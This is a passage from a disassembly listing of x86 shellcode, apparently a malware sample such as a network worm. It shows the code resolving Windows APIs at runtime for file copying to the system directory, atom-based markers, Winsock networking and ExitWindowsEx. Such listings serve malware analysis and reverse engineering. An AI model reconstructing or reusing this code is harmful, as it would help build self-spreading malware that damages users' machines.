+seg000:000004DA			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000004DF	43 72 65 61 74 65+aCreatethread	  db 'CreateThread',0
+seg000:000004EC			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000004EC			  
+seg000:000004EC			  SETUP_Createthread:			  ; CODE XREF: sub_1C4+316p
+seg000:000004EC	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:000004EF	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000004F2	89 45 F0			  mov	  [ebp+CreateThread], eax
+seg000:000004F5	E8 0D 00 00 00			  call	  SETUP_Gettickcount ; Call Procedure
+seg000:000004F5			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000004FA	47 65 74 54 69 63+aGettickcount	  db 'GetTickCount',0
+seg000:00000507			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000507			  
+seg000:00000507			  SETUP_Gettickcount:			  ; CODE XREF: sub_1C4+331p
+seg000:00000507	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:0000050A	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:0000050D	89 45 EC			  mov	  [ebp+GetTickCount], eax
+seg000:00000510	E8 06 00 00 00			  call	  SETUP_Sleep	  ; Call Procedure
+seg000:00000510			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000515	53 6C 65 65 70 00 aSleep_0	  db 'Sleep',0
+seg000:0000051B			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000051B			  
+seg000:0000051B			  SETUP_Sleep:				  ; CODE XREF: sub_1C4+34Cp
+seg000:0000051B	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:0000051E	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000521	89 45 E8			  mov	  [ebp+Sleep], eax
+seg000:00000524	E8 17 00 00 00			  call	  SETUP_Getsystemdefau ; Call Procedure
+seg000:00000524			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000529	47 65 74 53 79 73+aGetsystemdefau db 'GetSystemDefaultLangID',0
+seg000:00000540			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000540			  
+seg000:00000540			  SETUP_Getsystemdefau:			  ; CODE XREF: sub_1C4+360p
+seg000:00000540	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:00000543	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000546	89 45 E4			  mov	  [ebp+GetSystemDefaultLangID],	eax
+seg000:00000549	E8 14 00 00 00			  call	  SETUP_Getsystemdirec ; Call Procedure
+seg000:00000549			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000054E	47 65 74 53 79 73+aGetsystemdirec db 'GetSystemDirectoryA',0
+seg000:00000562			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000562			  
+seg000:00000562			  SETUP_Getsystemdirec:			  ; CODE XREF: sub_1C4+385p
+seg000:00000562	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:00000565	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000568	89 45 E0			  mov	  [ebp+GetSystemDirectoryA], eax
+seg000:0000056B	E8 0A 00 00 00			  call	  SETUP_Copyfilea ; Call Procedure
+seg000:0000056B			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000570	43 6F 70 79 46 69+aCopyfilea	  db 'CopyFileA',0
+seg000:0000057A			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000057A			  
+seg000:0000057A			  SETUP_Copyfilea:			  ; CODE XREF: sub_1C4+3A7p
+seg000:0000057A	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:0000057D	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000580	89 45 DC			  mov	  [ebp+CopyFileA], eax
+seg000:00000583	E8 10 00 00 00			  call	  SETUP_GlobalFindAtomA	; Call Procedure
+seg000:00000583			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000588	47 6C 6F 62 61 6C+aGlobalfindatom db 'GlobalFindAtomA',0
+seg000:00000598			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000598			  
+seg000:00000598			  SETUP_GlobalFindAtomA:		  ; CODE XREF: sub_1C4+3BFp
+seg000:00000598	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:0000059B	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:0000059E	89 45 D8			  mov	  [ebp+GlobalFindAtomA], eax
+seg000:000005A1	E8 0F 00 00 00			  call	  SETUP_GlobalAddAtomA ; Call Procedure
+seg000:000005A1			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000005A6	47 6C 6F 62 61 6C+aGlobaladdatoma db 'GlobalAddAtomA',0
+seg000:000005B5			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000005B5			  
+seg000:000005B5			  SETUP_GlobalAddAtomA:			  ; CODE XREF: sub_1C4+3DDp
+seg000:000005B5	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:000005B8	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000005BB	89 45 D4			  mov	  [ebp+GlobalAddAtomA],	eax
+seg000:000005BE	E8 0C 00 00 00			  call	  SETUP_CloseHandle ; Call Procedure
+seg000:000005BE			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000005C3	43 6C 6F 73 65 48+aCloseHandle	  db 'CloseHandle',0
+seg000:000005CF			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000005CF			  
+seg000:000005CF			  SETUP_CloseHandle:			  ; CODE XREF: sub_1C4+3FAp
+seg000:000005CF	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:000005D2	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000005D5	89 45 D0			  mov	  [ebp+CloseHandle], eax
+seg000:000005D8	E8 08 00 00 00			  call	  SETUP_lcreat	  ; Call Procedure
+seg000:000005D8			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000005DD	5F 6C 63 72 65 61+a_lcreat	  db '_lcreat',0
+seg000:000005E5			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000005E5			  
+seg000:000005E5			  SETUP_lcreat:				  ; CODE XREF: sub_1C4+414p
+seg000:000005E5	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:000005E8	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000005EB	89 45 CC			  mov	  [ebp+_lcreat], eax
+seg000:000005EE	E8 08 00 00 00			  call	  SETUP_lwrite	  ; Call Procedure
+seg000:000005EE			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000005F3	5F 6C 77 72 69 74+a_lwrite	  db '_lwrite',0
+seg000:000005FB			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000005FB			  
+seg000:000005FB			  SETUP_lwrite:				  ; CODE XREF: sub_1C4+42Ap
+seg000:000005FB	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:000005FE	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000601	89 45 C8			  mov	  [ebp+_lwrite], eax
+seg000:00000604	E8 08 00 00 00			  call	  SETUP_lclose	  ; Call Procedure
+seg000:00000604			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000609	5F 6C 63 6C 6F 73+a_lclose	  db '_lclose',0
+seg000:00000611			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000611			  
+seg000:00000611			  SETUP_lclose:				  ; CODE XREF: sub_1C4+440p
+seg000:00000611	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:00000614	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000617	89 45 C4			  mov	  [ebp+_lclose], eax
+seg000:0000061A	E8 0E 00 00 00			  call	  SETUP_GetSystemTime ;	Call Procedure
+seg000:0000061A			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000061F	47 65 74 53 79 73+aGetsystemtime  db 'GetSystemTime',0
+seg000:0000062D			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000062D			  
+seg000:0000062D			  SETUP_GetSystemTime:			  ; CODE XREF: sub_1C4+456p
+seg000:0000062D	FF 75 FC			  push	  [ebp+HMODULE_KERNEL32]
+seg000:00000630	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000633	89 45 C0			  mov	  [ebp+GetSystemTime], eax
+seg000:00000636	E8 0B 00 00 00			  call	  SETUP_WS2_32	  ; Call Procedure
+seg000:00000636			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000063B	57 53 32 5F 33 32+aWs2_32_dll	  db 'WS2_32.DLL',0
+seg000:00000646			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000646			  
+seg000:00000646			  SETUP_WS2_32:				  ; CODE XREF: sub_1C4+472p
+seg000:00000646	FF 55 F4			  call	  [ebp+LoadLibraryA] ; Indirect	Call Near Procedure
+seg000:00000649	89 45 BC			  mov	  [ebp+HMODULE_WS2_32],	eax
+seg000:0000064C	E8 07 00 00 00			  call	  SETUP_socket	  ; Call Procedure
+seg000:0000064C			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000651	73 6F 63 6B 65 74+aSocket	  db 'socket',0
+seg000:00000658			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000658			  
+seg000:00000658			  SETUP_socket:				  ; CODE XREF: sub_1C4+488p
+seg000:00000658	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:0000065B	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:0000065E	89 45 B8			  mov	  [ebp+socket],	eax
+seg000:00000661	E8 0C 00 00 00			  call	  SETUP_closesocket ; Call Procedure
+seg000:00000661			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000666	63 6C 6F 73 65 73+aClosesocket	  db 'closesocket',0
+seg000:00000672			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000672			  
+seg000:00000672			  SETUP_closesocket:			  ; CODE XREF: sub_1C4+49Dp
+seg000:00000672	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:00000675	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000678	89 45 B4			  mov	  [ebp+closesocket], eax
+seg000:0000067B	E8 0C 00 00 00			  call	  SETUP_ioctlsocket ; Call Procedure
+seg000:0000067B			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000680	69 6F 63 74 6C 73+aIoctlsocket	  db 'ioctlsocket',0
+seg000:0000068C			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000068C			  
+seg000:0000068C			  SETUP_ioctlsocket:			  ; CODE XREF: sub_1C4+4B7p
+seg000:0000068C	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:0000068F	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000692	89 45 A4			  mov	  [ebp+ioctlsocket], eax
+seg000:00000695	E8 08 00 00 00			  call	  SETUP_connect	  ; Call Procedure
+seg000:00000695			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000069A	63 6F 6E 6E 65 63+aConnect	  db 'connect',0
+seg000:000006A2			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000006A2			  
+seg000:000006A2			  SETUP_connect:			  ; CODE XREF: sub_1C4+4D1p
+seg000:000006A2	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:000006A5	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000006A8	89 45 B0			  mov	  [ebp+connect], eax
+seg000:000006AB	E8 07 00 00 00			  call	  SETUP_select	  ; Call Procedure
+seg000:000006AB			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000006B0	73 65 6C 65 63 74+aSelect	  db 'select',0
+seg000:000006B7			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000006B7			  
+seg000:000006B7			  SETUP_select:				  ; CODE XREF: sub_1C4+4E7p
+seg000:000006B7	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:000006BA	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000006BD	89 45 A0			  mov	  [ebp+select],	eax
+seg000:000006C0	E8 05 00 00 00			  call	  SETUP_send	  ; Call Procedure
+seg000:000006C0			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000006C5	73 65 6E 64 00	  aSend		  db 'send',0
+seg000:000006CA			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000006CA			  
+seg000:000006CA			  SETUP_send:				  ; CODE XREF: sub_1C4+4FCp
+seg000:000006CA	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:000006CD	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000006D0	89 45 AC			  mov	  [ebp+send], eax
+seg000:000006D3	E8 05 00 00 00			  call	  SETUP_recv	  ; Call Procedure
+seg000:000006D3			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000006D8	72 65 63 76 00	  aRecv		  db 'recv',0
+seg000:000006DD			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000006DD			  
+seg000:000006DD			  SETUP_recv:				  ; CODE XREF: sub_1C4+50Fp
+seg000:000006DD	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:000006E0	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000006E3	89 45 A8			  mov	  [ebp+recv], eax
+seg000:000006E6	E8 0C 00 00 00			  call	  SETUP_gethostname ; Call Procedure
+seg000:000006E6			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000006EB	67 65 74 68 6F 73+aGethostname	  db 'gethostname',0
+seg000:000006F7			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:000006F7			  
+seg000:000006F7			  SETUP_gethostname:			  ; CODE XREF: sub_1C4+522p
+seg000:000006F7	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:000006FA	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:000006FD	89 45 9C			  mov	  [ebp+gethostname], eax
+seg000:00000700	E8 0E 00 00 00			  call	  SETUP_gethostbyname ;	Call Procedure
+seg000:00000700			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000705	67 65 74 68 6F 73+aGethostbyname  db 'gethostbyname',0
+seg000:00000713			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000713			  
+seg000:00000713			  SETUP_gethostbyname:			  ; CODE XREF: sub_1C4+53Cp
+seg000:00000713	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:00000716	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000719	89 45 98			  mov	  [ebp+gethostbyname], eax
+seg000:0000071C	E8 10 00 00 00			  call	  SETUP_WSAGetLastError	; Call Procedure
+seg000:0000071C			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000721	57 53 41 47 65 74+aWsagetlasterro db 'WSAGetLastError',0
+seg000:00000731			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:00000731			  
+seg000:00000731			  SETUP_WSAGetLastError:		  ; CODE XREF: sub_1C4+558p
+seg000:00000731	FF 75 BC			  push	  [ebp+HMODULE_WS2_32]
+seg000:00000734	FF 55 F8			  call	  [ebp+GetProcAddress] ; Indirect Call Near Procedure
+seg000:00000737	89 45 94			  mov	  [ebp+WSAGetLastError], eax
+seg000:0000073A	E8 0B 00 00 00			  call	  SETUP_USER32	  ; Call Procedure
+seg000:0000073A			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000073F	55 53 45 52 33 32+aUser32_dll	  db 'USER32.DLL',0
+seg000:0000074A			  ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+seg000:0000074A			  
+seg000:0000074A			  SETUP_USER32:				  ; CODE XREF: sub_1C4+576p
+seg000:0000074A	FF 55 F4			  call	  [ebp+LoadLibraryA] ; Indirect	Call Near Procedure
+seg000:0000074D	89 45 90			  mov	  [ebp+HMODULE_USER32],	eax
+seg000:00000750	E8 0E 00 00 00			  call	  SETUP_ExitWindowsEx ;	Call Procedure
